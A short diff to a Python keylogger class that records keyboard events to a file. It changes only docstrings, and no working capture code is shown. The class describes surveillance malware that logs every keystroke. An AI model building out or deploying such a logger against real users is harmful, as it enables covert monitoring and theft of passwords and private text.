@@ -1,11 +1,14 @@
 import keyboard
 
 
+"""
+Class designed to put every keyboard ouptuts in a file.
+"""
 class Keylogger:
 
 
     """
-    Initializes the buffer 
+    Initializes the buffer.
     """
     def __init__(self):
 
@@ -13,7 +16,7 @@ class Keylogger:
 
 
     """
-    Entry point.
+    Main loop waiting for keyboard events.
     """
     def run(self):
 
@@ -22,7 +25,7 @@ class Keylogger:
     
 
     """
-    Callback function to record keyboard event and save the resulting buffer into a file.
+    Callback function to record keyboard events and save the resulting buffer into a file.
     """
     def onKeyPressed(self, event):
 
